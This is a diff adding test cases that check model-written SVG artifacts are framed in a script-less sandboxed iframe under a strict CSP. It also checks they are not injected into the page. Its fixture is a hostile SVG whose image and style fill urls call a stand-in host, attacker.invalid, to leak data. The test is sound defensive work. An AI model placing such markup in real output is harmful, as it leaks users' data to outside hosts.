@@ -34,7 +34,11 @@ const artifactIframe = () => {
 	const attrs = Object.fromEntries(
 		[...(frames[0] ?? '').matchAll(/\s([a-z-]+)="([^"]*)"/g)].map((m) => [m[1], decode(m[2])])
 	);
-	return { attrs, sandbox: (attrs.sandbox ?? '').split(/\s+/).filter(Boolean) };
+	return {
+		attrs,
+		sandbox: (attrs.sandbox ?? '').split(/\s+/).filter(Boolean),
+		outside: body.replace(/<iframe\b[\s\S]*?<\/iframe>/g, '')
+	};
 };
 
 describe('Artifacts iframe sandbox', () => {
@@ -75,5 +79,61 @@ describe('Artifacts iframe sandbox', () => {
 		expect(attrs.srcdoc).toBe(
 			`<meta http-equiv="Content-Security-Policy" content="${CSP}"><p>Synthetic artifact</p>`
 		);
+	});
+});
+
+// An ```svg block is model-written markup too, and used to be injected into the page itself
+// (DOMPurify keeps href, style and <style>), outside every CSP. It now gets the same cage as
+// an HTML artifact: a script-less sandboxed iframe behind the CSP meta.
+describe('Artifacts SVG artifact', () => {
+	const SVG =
+		'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">' +
+		'<image href="https://attacker.invalid/p.png?q=restored" width="5" height="5"/>' +
+		'<rect width="5" height="5" style="fill:url(https://attacker.invalid/f.svg#a)"/></svg>';
+
+	beforeEach(() => {
+		vi.spyOn(console, 'log').mockImplementation(() => {});
+		artifactContents.set([{ type: 'svg', content: SVG }] as any);
+		config.set({ ui: { iframe_csp: CSP } } as any);
+		settings.set({} as any);
+	});
+	afterEach(() => {
+		cleanups.splice(0).forEach((cleanup) => cleanup());
+		artifactContents.set([] as any);
+		settings.set({} as any);
+		vi.restoreAllMocks();
+	});
+
+	it('is framed, never injected into the page, so nothing remote is fetched from the page', () => {
+		const { outside } = artifactIframe();
+		expect(outside).not.toContain('viewBox="0 0 10 10"'); // the artifact's own <svg>, not a toolbar icon
+		expect(outside).not.toContain('<image');
+		expect(outside).not.toContain('attacker.invalid');
+	});
+
+	it('is fully sandboxed: no scripts, no navigation, nothing allowed', () => {
+		const { sandbox, attrs } = artifactIframe();
+		expect('sandbox' in attrs).toBe(true);
+		expect(sandbox).toEqual([]);
+	});
+
+	it('sits behind the deployment CSP, which comes before the markup', () => {
+		const { attrs } = artifactIframe();
+		const doc = attrs.srcdoc as string;
+		const meta = `<meta http-equiv="Content-Security-Policy" content="${CSP}">`;
+		expect(doc).toContain(meta);
+		expect(doc.indexOf(meta)).toBeLessThan(doc.indexOf('<svg'));
+		expect(doc).toContain(SVG);
+	});
+
+	it('sits behind a strict CSP even when the deployment configures none', () => {
+		config.set({ ui: {} } as any);
+		const { attrs } = artifactIframe();
+		const doc = attrs.srcdoc as string;
+		const policy = doc.match(/Content-Security-Policy" content="([^"]*)"/)?.[1] ?? '';
+		expect(policy).toContain("default-src 'none'");
+		expect(policy).toContain('img-src data: blob:');
+		expect(policy).toContain("base-uri 'none'");
+		expect(doc.indexOf('Content-Security-Policy')).toBeLessThan(doc.indexOf('<svg'));
 	});
 });
